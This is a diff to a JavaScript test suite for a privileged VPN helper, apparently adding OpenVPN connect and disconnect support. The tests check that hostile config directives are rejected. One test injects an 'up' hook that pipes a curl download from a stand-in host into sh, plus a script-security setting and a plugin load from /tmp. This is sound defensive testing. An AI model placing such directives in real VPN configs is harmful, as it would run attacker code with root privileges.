@@ -34,7 +34,9 @@ function makeDeps() {
     writeWgConfig: () => '/run/katacomb-vpn/sntl0.conf',
     resolveTun2Socks: () => '/pinned/tun2socks',
     resolveAmneziaWgBinDir: () => '/pinned/awg-bin',
-    checkStatus: () => ({ wgUp: true, tunUp: false }),
+    resolveOpenVpnBinary: () => '/usr/sbin/openvpn',
+    writeOpenVpnConfig: () => '/run/katacomb-vpn/openvpn.conf',
+    checkStatus: () => ({ wgUp: true, tunUp: false, ovpnUp: false }),
   }
   return { deps, helperCalls }
 }
@@ -110,7 +112,7 @@ test('status returns kernel interface state from deps', () => {
   const { deps } = makeDeps()
   const res = handleRequest(req('status'), deps)
   assert.equal(res.ok, true)
-  assert.deepEqual(res.result, { wgUp: true, tunUp: false })
+  assert.deepEqual(res.result, { wgUp: true, tunUp: false, ovpnUp: false })
 })
 
 test('an unknown op is rejected', () => {
@@ -167,4 +169,77 @@ test('amneziawg_down calls the awg-down verb', () => {
   const res = handleRequest(req('amneziawg_down'), deps)
   assert.equal(res.ok, true)
   assert.deepEqual(helperCalls, [['awg-down']])
+})
+
+const CLEAN_OVPN = `client
+dev sntl-ovpn
+dev-type tun
+proto udp
+remote 203.0.113.10 1194
+nobind
+persist-key
+persist-tun
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIBizCCATGgAwIBAgIUJRlanpHf774AH9U8QVutSO9eKu4wCgYIKoZIzj0EAwIw
+-----END CERTIFICATE-----
+</ca>
+<cert>
+-----BEGIN CERTIFICATE-----
+MIIBfjCCASOgAwIBAgIUFLHnWPS7pvYXkZ2qdzUfJJNPlAwwCgYIKoZIzj0EAwIw
+-----END CERTIFICATE-----
+</cert>
+<key>
+-----BEGIN PRIVATE KEY-----
+MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQg0cApCgzxt44Fs/VV
+-----END PRIVATE KEY-----
+</key>
+<tls-crypt>
+-----BEGIN OpenVPN Static key V1-----
+8fb4e3efd49b79d59624c1ddc5b0669b
+-----END OpenVPN Static key V1-----
+</tls-crypt>
+`
+
+test('openvpn_up accepts a clean config and passes only the root-owned path', () => {
+  const { deps, helperCalls } = makeDeps()
+  const res = handleRequest(req('openvpn_up', { configString: CLEAN_OVPN }), deps)
+  assert.equal(res.ok, true)
+  // No binary is forwarded — the helper resolves openvpn from its own allow-list.
+  assert.deepEqual(helperCalls, [['ovpn-up', '/run/katacomb-vpn/openvpn.conf']])
+})
+
+test('openvpn_up REJECTS a script directive and never calls the helper', () => {
+  const { deps, helperCalls } = makeDeps()
+  for (const evil of [
+    CLEAN_OVPN.replace('nobind', 'up /bin/sh -c "curl evil | sh"'),
+    CLEAN_OVPN.replace('nobind', 'script-security 2'),
+    CLEAN_OVPN.replace('nobind', 'plugin /tmp/evil.so'),
+  ]) {
+    const res = handleRequest(req('openvpn_up', { configString: evil }), deps)
+    assert.equal(res.ok, false)
+  }
+  assert.equal(helperCalls.length, 0)
+})
+
+test('openvpn_up fails CLOSED when openvpn is not installed', () => {
+  const { deps, helperCalls } = makeDeps()
+  deps.resolveOpenVpnBinary = () => { throw new Error('openvpn not installed') }
+  const res = handleRequest(req('openvpn_up', { configString: CLEAN_OVPN }), deps)
+  assert.equal(res.ok, false)
+  assert.equal(helperCalls.length, 0)
+})
+
+test('openvpn_up requires a configString', () => {
+  const { deps, helperCalls } = makeDeps()
+  const res = handleRequest(req('openvpn_up', { configPath: '/tmp/evil.conf' }), deps)
+  assert.equal(res.ok, false)
+  assert.equal(helperCalls.length, 0)
+})
+
+test('openvpn_down calls the ovpn-down verb', () => {
+  const { deps, helperCalls } = makeDeps()
+  const res = handleRequest(req('openvpn_down'), deps)
+  assert.equal(res.ok, true)
+  assert.deepEqual(helperCalls, [['ovpn-down']])
 })
